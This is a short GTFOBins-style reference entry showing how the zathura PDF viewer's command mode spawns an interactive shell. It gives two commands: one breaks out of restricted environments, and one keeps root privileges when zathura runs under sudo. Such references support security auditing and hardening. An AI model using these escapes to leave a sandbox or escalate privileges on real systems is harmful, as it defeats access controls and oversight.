# GTFOBin: zathura

The interaction happens in a GUI window, while the shell is dropped in the terminal.

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
zathura
:! /bin/sh -c 'exec /bin/sh 0<&1'
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo zathura
:! /bin/sh -c 'exec /bin/sh 0<&1'
```